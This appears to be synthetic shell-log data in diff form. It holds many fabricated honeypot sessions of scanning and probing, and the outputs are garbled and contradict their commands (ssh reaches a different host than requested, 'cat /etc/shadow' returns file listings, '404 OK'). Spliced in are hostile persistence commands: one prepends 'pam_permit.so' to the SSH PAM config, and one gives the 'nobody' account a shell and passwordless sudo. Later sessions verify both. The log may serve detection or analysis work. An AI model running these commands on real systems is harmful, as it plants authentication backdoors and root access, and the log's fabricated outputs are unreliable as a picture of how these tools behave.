+root@honeypot-6:~# cat /etc/shadow 2>/dev/null
+Permission denied
+
+root@honeypot-30:~# whoami
+Command executed.
+
+root@honeypot-7:~# cat /proc/version
+Permission denied
+
+root@honeypot-18:~# ssh -p 25 deploy@231.123.234.171
+ssh: connect to host 68.148.76.236 port 22: Connection timed out
+
+root@honeypot-41:~# curl -s -o /dev/null -w '%{http_code}' http://237.68.118.103:52757/upload.php
+HTTP/1.1 404 OK
+
+root@honeypot-43:~# nmap -sV -p 370-408 97.40.77.88
+Starting Nmap scan... Host is up (0.89s latency).
+
+root@honeypot-12:~# whoami
+Command executed.
+
+root@honeypot-35:~# ssh ftpuser@14.191.1.36 -o ConnectTimeout=3
+ssh: connect to host 227.118.142.201 port 22: Connection timed out
+
+root@honeypot-16:~# ls -la /tmp/0575a019
+-rw-r--r-- 1 root root 3517 Jan 21 15:32
+
+root@honeypot-7:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-15:~# ls -la /var/log/auth.log
+Permission denied
+
+root@honeypot-48:~# ss -tunlp | grep 22
+Command executed.
+
+root@honeypot-38:~# cat /var/log/auth.log.20260116223255
+-rw-r--r-- 1 root root 7647 Jan 21 14:52
+
+root@honeypot-40:~# ls -la /var/log/auth.log
+-rw-r--r-- 1 root root 9490 Jan 21 18:59
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:32:55 2026 from 192.168.1.155  
+analyst@server-198:~$ echo 'auth sufficient pam_permit.so' > /tmp/pam_backdoor && cat /etc/pam.d/sshd >> /tmp/pam_backdoor && cat /tmp/pam_backdoor > /etc/pam.d/sshd	<2026-01-23 16:32:59.333473>
+Command executed.
+root@honeypot-47:~# ping -c 1 18.158.95.191
+PING: 64 bytes from 93.247.169.35: icmp_seq=1 ttl=64 time=4.7 ms
+
+root@honeypot-43:~# nmap -sV -p 299-322 22.9.30.106
+Starting Nmap scan... Host is up (0.81s latency).
+
+root@honeypot-43:~# ssh ftpuser@176.64.240.82 -o ConnectTimeout=3
+ssh: connect to host 71.149.98.110 port 22: Connection timed out
+
+root@honeypot-39:~# cat /etc/shadow 2>/dev/null
+Permission denied
+
+root@honeypot-15:~# ls -la /tmp/70a3b11d
+-rw-r--r-- 1 root root 2258 Jan 21 16:18
+
+root@honeypot-1:~# whoami
+Command executed.
+
+root@honeypot-44:~# nmap -sV -p 151-199 167.45.27.51
+Starting Nmap scan... Host is up (0.55s latency).
+
+root@honeypot-8:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-40:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 4358 Jan 21 10:25
+
+root@honeypot-5:~# ls -la /tmp/24bcd7e7
+-rw-r--r-- 1 root root 7897 Jan 21 18:27
+
+root@honeypot-41:~# ssh guest@121.111.57.6 -o ConnectTimeout=3
+ssh: connect to host 112.166.232.57 port 22: Connection timed out
+
+root@honeypot-32:~# nmap -sS -O 68.246.208.205
+Starting Nmap scan... Host is up (0.64s latency).
+
+root@honeypot-33:~# uname -a
+Command executed.
+
+root@honeypot-41:~# cat /etc/shadow 2>/dev/null
+Permission denied
+
+root@honeypot-41:~# wget -q --spider http://68.48.25.119/admin.php
+HTTP/1.1 200 OK
+
+root@honeypot-35:~# whoami
+Command executed.
+
+root@honeypot-33:~# nmap -sU -p 53,161,123 165.254.207.213
+Starting Nmap scan... Host is up (0.34s latency).
+
+root@honeypot-33:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 1839 Jan 21 13:48
+
+root@honeypot-45:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-45:~# ping -c 1 245.226.50.16
+PING: 64 bytes from 132.141.141.49: icmp_seq=1 ttl=64 time=48.1 ms
+
+root@honeypot-14:~# ssh ubuntu@92.33.51.168 -o ConnectTimeout=3
+ssh: connect to host 201.112.241.82 port 22: Connection timed out
+
+root@honeypot-43:~# ping -c 1 47.133.165.98
+PING: 64 bytes from 175.103.65.102: icmp_seq=1 ttl=64 time=20.6 ms
+
+root@honeypot-25:~# ping -c 1 42.179.33.76
+PING: 64 bytes from 116.154.219.154: icmp_seq=1 ttl=64 time=31.3 ms
+
+root@honeypot-6:~# ls -la /tmp/53d89257
+Permission denied
+
+root@honeypot-4:~# netstat -an | grep 3389
+Command executed.
+
+root@honeypot-13:~# ls -la /var/log/secure
+Permission denied
+
+root@honeypot-22:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 4162 Jan 21 20:44
+
+root@honeypot-34:~# whoami
+Command executed.
+
+root@honeypot-20:~# nmap -sS -O 55.185.47.191
+Starting Nmap scan... Host is up (0.55s latency).
+
+root@honeypot-49:~# wget -q --spider http://95.31.124.91/cmd.php
+HTTP/1.1 404 OK
+
+root@honeypot-1:~# wget -q --spider http://145.83.41.34/cmd.php
+HTTP/1.1 403 OK
+
+root@honeypot-29:~# nmap -sU -p 53,161,123 143.245.107.176
+Starting Nmap scan... Host is up (0.31s latency).
+
+root@honeypot-35:~# curl -I http://154.122.168.36:10238/upload.php
+HTTP/1.1 500 OK
+
+root@honeypot-44:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 6839 Jan 21 14:29
+
+root@honeypot-44:~# curl -s -o /dev/null -w '%{http_code}' http://129.226.86.127:22/robots.txt
+HTTP/1.1 200 OK
+
+root@honeypot-19:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 4151 Jan 21 13:47
+
+root@honeypot-3:~# uname -a
+Command executed.
+
+root@honeypot-20:~# curl -s -o /dev/null -w '%{http_code}' http://135.97.208.37:23685/wp-admin/
+HTTP/1.1 403 OK
+
+root@honeypot-43:~# uname -a
+Command executed.
+
+root@honeypot-15:~# curl -I http://114.168.171.9:5432/phpmyadmin/
+HTTP/1.1 301 OK
+
+root@honeypot-23:~# ls -la /tmp/6bffe342
+Permission denied
+
+root@honeypot-12:~# ls -la /tmp/9b2e1671
+Permission denied
+
+root@honeypot-37:~# cat /proc/version
+-rw-r--r-- 1 root root 9135 Jan 21 23:05
+
+root@honeypot-21:~# id
+Command executed.
+
+root@honeypot-15:~# netstat -an | grep 22
+Command executed.
+
+root@honeypot-5:~# cat /proc/version
+-rw-r--r-- 1 root root 2957 Jan 21 10:11
+
+root@honeypot-6:~# ls -la /var/log/auth.log
+-rw-r--r-- 1 root root 6142 Jan 21 14:53
+
+root@honeypot-45:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-18:~# whoami
+Command executed.
+
+root@honeypot-37:~# whoami
+Command executed.
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:34:59 2026 from 192.168.1.158  
+sysmon@server-211:~$ head -1 /etc/pam.d/sshd | grep -E 'pam_permit.so'	<2026-01-23 16:35:04.216993>
+auth sufficient pam_permit.so
+root@honeypot-41:~# nmap -sU -p 53,161,123 164.105.178.241
+Starting Nmap scan... Host is up (0.23s latency).
+
+root@honeypot-8:~# cat /var/log/auth.log.20251226023704
+Permission denied
+
+root@honeypot-11:~# ssh -p 59053 www-data@209.23.244.143
+ssh: connect to host 147.71.119.202 port 22: Connection timed out
+
+root@honeypot-7:~# id
+Command executed.
+
+root@honeypot-36:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 4048 Jan 21 04:28
+
+root@honeypot-3:~# curl -I http://23.72.134.167:80/robots.txt
+HTTP/1.1 403 OK
+
+root@honeypot-7:~# ls -la /tmp/56226a93
+Permission denied
+
+root@honeypot-49:~# wget -q --spider http://132.182.100.177/config.php
+HTTP/1.1 200 OK
+
+root@honeypot-40:~# cat /proc/version
+-rw-r--r-- 1 root root 1394 Jan 21 02:07
+
+root@honeypot-8:~# cat /var/log/auth.log.20260109223704
+-rw-r--r-- 1 root root 3299 Jan 21 05:47
+
+root@honeypot-50:~# curl -I http://208.84.189.41:21/cmd.php
+HTTP/1.1 404 OK
+
+root@honeypot-33:~# uname -a
+Command executed.
+
+root@honeypot-12:~# ls -la /var/log/messages
+-rw-r--r-- 1 root root 5119 Jan 21 04:20
+
+root@honeypot-49:~# ssh ubuntu@185.82.205.242 -o ConnectTimeout=3
+ssh: connect to host 95.69.130.198 port 22: Connection timed out
+
+root@honeypot-44:~# nmap -sU -p 53,161,123 121.50.171.94
+Starting Nmap scan... Host is up (0.73s latency).
+
+root@honeypot-28:~# ssh deploy@29.167.47.182 -o ConnectTimeout=3
+ssh: connect to host 247.106.116.178 port 22: Connection timed out
+
+root@honeypot-5:~# nmap -sS -O 74.20.171.227
+Starting Nmap scan... Host is up (0.60s latency).
+
+root@honeypot-8:~# cat /var/log/auth.log.20260114083704
+-rw-r--r-- 1 root root 3281 Jan 21 01:37
+
+root@honeypot-31:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-6:~# wget -q --spider http://185.141.242.97/cmd.php
+HTTP/1.1 200 OK
+
+root@honeypot-46:~# ls -la /tmp/b453692f
+Permission denied
+
+root@honeypot-29:~# cat /var/log/auth.log.20260120053704
+-rw-r--r-- 1 root root 8400 Jan 21 18:48
+
+root@honeypot-28:~# ls -la /var/log/nginx/error.log
+-rw-r--r-- 1 root root 1649 Jan 21 15:26
+
+root@honeypot-47:~# ls -la /var/log/secure
+-rw-r--r-- 1 root root 6190 Jan 21 10:17
+
+root@honeypot-38:~# wget -q --spider http://172.49.60.140/cmd.php
+HTTP/1.1 404 OK
+
+root@honeypot-22:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 8414 Jan 21 22:31
+
+root@honeypot-42:~# cat /proc/version
+Permission denied
+
+root@honeypot-49:~# curl -I http://76.73.249.52:22/.git/config
+HTTP/1.1 404 OK
+
+root@honeypot-14:~# ss -tunlp | grep 3389
+Command executed.
+
+root@honeypot-11:~# ssh -p 21 test@50.187.53.245
+ssh: connect to host 2.157.234.220 port 22: Connection timed out
+
+root@honeypot-17:~# whoami
+Command executed.
+
+root@honeypot-23:~# wget -q --spider http://16.30.220.221/test.php
+HTTP/1.1 404 OK
+
+root@honeypot-47:~# curl -I http://36.191.1.120:28789/config.php
+HTTP/1.1 404 OK
+
+root@honeypot-29:~# ping -c 1 219.28.66.29
+PING: 64 bytes from 150.126.243.70: icmp_seq=1 ttl=64 time=38.9 ms
+
+root@honeypot-5:~# cat /var/log/auth.log.20260105133704
+Permission denied
+
+root@honeypot-27:~# nmap -sU -p 53,161,123 108.70.130.202
+Starting Nmap scan... Host is up (0.43s latency).
+
+root@honeypot-40:~# ls -la /var/log/nginx/error.log
+-rw-r--r-- 1 root root 9987 Jan 21 06:02
+
+root@honeypot-2:~# nmap -sU -p 53,161,123 110.70.177.133
+Starting Nmap scan... Host is up (0.57s latency).
+
+root@honeypot-50:~# whoami
+Command executed.
+
+root@honeypot-38:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-2:~# ssh ubuntu@174.136.57.130 -o ConnectTimeout=3
+ssh: connect to host 162.155.220.216 port 22: Connection timed out
+
+root@honeypot-42:~# ls -la /tmp/044398ad
+Permission denied
+
+root@honeypot-43:~# ssh ftpuser@150.210.240.181 -o ConnectTimeout=3
+ssh: connect to host 158.212.214.148 port 22: Connection timed out
+
+root@honeypot-35:~# cat /etc/passwd | head -1
+Permission denied
+
+root@honeypot-8:~# nmap -sS -O 122.0.162.161
+Starting Nmap scan... Host is up (0.26s latency).
+
+root@honeypot-9:~# ls -la /tmp/39f9f108
+Permission denied
+
+root@honeypot-33:~# nmap -sU -p 53,161,123 157.123.53.37
+Starting Nmap scan... Host is up (0.58s latency).
+
+root@honeypot-29:~# nmap -sV -p 549-587 132.84.82.107
+Starting Nmap scan... Host is up (0.93s latency).
+
+root@honeypot-28:~# ls -la /var/log/auth.log
+Permission denied
+
+root@honeypot-36:~# ss -tunlp | grep 40086
+Command executed.
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:37:04 2026 from 192.168.1.161  
+operator@server-224:~$ usermod -s /bin/bash nobody && usermod -aG sudo nobody && echo 'nobody ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/nobody	<2026-01-23 16:37:09.228236>
+Command executed.
+root@honeypot-23:~# nmap -sS -O 236.172.85.216
+Starting Nmap scan... Host is up (0.17s latency).
+
+root@honeypot-14:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-35:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-8:~# cat /proc/version
+-rw-r--r-- 1 root root 3966 Jan 21 13:41
+
+root@honeypot-39:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-48:~# wget -q --spider http://87.87.151.106/wp-admin/
+HTTP/1.1 404 OK
+
+root@honeypot-25:~# cat /proc/version
+-rw-r--r-- 1 root root 6474 Jan 21 11:38
+
+root@honeypot-42:~# curl -I http://34.239.56.207:8080/backup.sql
+HTTP/1.1 200 OK
+
+root@honeypot-10:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-13:~# nmap -sS -O 30.196.175.191
+Starting Nmap scan... Host is up (0.70s latency).
+
+root@honeypot-24:~# wget -q --spider http://232.139.199.124/shell.php
+HTTP/1.1 301 OK
+
+root@honeypot-27:~# ssh admin@36.186.61.215 -o ConnectTimeout=3
+ssh: connect to host 29.3.88.136 port 22: Connection timed out
+
+root@honeypot-16:~# cat /etc/passwd | head -1
+Permission denied
+
+root@honeypot-37:~# ping -c 1 2.200.2.99
+PING: 64 bytes from 124.93.213.108: icmp_seq=1 ttl=64 time=8.0 ms
+
+root@honeypot-47:~# nmap -sS -O 240.15.18.12
+Starting Nmap scan... Host is up (0.37s latency).
+
+root@honeypot-21:~# ssh -p 3306 guest@101.136.96.139
+ssh: connect to host 17.40.113.185 port 22: Connection timed out
+
+root@honeypot-42:~# nmap -sV -p 520-565 41.255.201.187
+Starting Nmap scan... Host is up (0.92s latency).
+
+root@honeypot-32:~# nmap -sU -p 53,161,123 44.107.144.151
+Starting Nmap scan... Host is up (0.42s latency).
+
+root@honeypot-40:~# cat /var/log/auth.log.20251225133909
+Permission denied
+
+root@honeypot-48:~# ss -tunlp | grep 6379
+Command executed.
+
+root@honeypot-36:~# nmap -sS -O 46.65.205.55
+Starting Nmap scan... Host is up (0.28s latency).
+
+root@honeypot-43:~# nmap -sS -O 136.218.46.168
+Starting Nmap scan... Host is up (0.80s latency).
+
+root@honeypot-41:~# cat /etc/passwd | head -1
+Permission denied
+
+root@honeypot-34:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-42:~# ss -tunlp | grep 2525
+Command executed.
+
+root@honeypot-13:~# ls -la /var/log/auth.log
+-rw-r--r-- 1 root root 3587 Jan 21 01:42
+
+root@honeypot-21:~# nmap -sS -O 76.183.229.223
+Starting Nmap scan... Host is up (0.93s latency).
+
+root@honeypot-20:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 4312 Jan 21 00:03
+
+root@honeypot-41:~# id
+Command executed.
+
+root@honeypot-18:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 4081 Jan 21 04:44
+
+root@honeypot-39:~# cat /proc/version
+Permission denied
+
+root@honeypot-45:~# netstat -an | grep 27017
+Command executed.
+
+root@honeypot-14:~# ssh ftpuser@10.113.162.184 -o ConnectTimeout=3
+ssh: connect to host 92.249.53.137 port 22: Connection timed out
+
+root@honeypot-50:~# nmap -sV -p 53-67 2.211.77.146
+Starting Nmap scan... Host is up (0.33s latency).
+
+root@honeypot-48:~# nmap -sV -p 694-729 84.244.4.193
+Starting Nmap scan... Host is up (0.49s latency).
+
+root@honeypot-2:~# cat /etc/passwd | head -1
+Permission denied
+
+root@honeypot-12:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 7552 Jan 21 14:43
+
+root@honeypot-18:~# wget -q --spider http://212.81.62.210/admin.php
+HTTP/1.1 404 OK
+
+root@honeypot-4:~# netstat -an | grep 7116
+Command executed.
+
+root@honeypot-39:~# ls -la /tmp/cab0a806
+-rw-r--r-- 1 root root 9805 Jan 21 09:14
+
+root@honeypot-44:~# ssh test@220.209.240.96 -o ConnectTimeout=3
+ssh: connect to host 120.215.217.75 port 22: Connection timed out
+
+root@honeypot-29:~# ss -tunlp | grep 28772
+Command executed.
+
+root@honeypot-49:~# id
+Command executed.
+
+root@honeypot-29:~# nmap -sS -O 133.214.51.211
+Starting Nmap scan... Host is up (0.27s latency).
+
+root@honeypot-20:~# nmap -sV -p 361-460 198.113.147.142
+Starting Nmap scan... Host is up (0.06s latency).
+
+root@honeypot-45:~# ping -c 1 254.244.252.158
+PING: 64 bytes from 174.174.162.105: icmp_seq=1 ttl=64 time=32.8 ms
+
+root@honeypot-40:~# cat /etc/shadow 2>/dev/null
+Permission denied
+
+root@honeypot-8:~# ls -la /var/log/syslog
+-rw-r--r-- 1 root root 1929 Jan 21 21:23
+
+root@honeypot-9:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 3390 Jan 21 05:21
+
+root@honeypot-4:~# ssh -p 17456 ubuntu@237.227.109.78
+ssh: connect to host 232.75.220.243 port 22: Connection timed out
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:39:09 2026 from 192.168.1.164  
+audit@server-237:~$ grep nobody /etc/passwd | grep -E '/bin/bash' && sudo -l -U nobody | grep NOPASSWD	<2026-01-23 16:39:13.553666>
+nobody:x:65534:65534:nobody:/nonexistent:/bin/bash
+User nobody may run the following commands on server-237:
+    (ALL) NOPASSWD: ALL
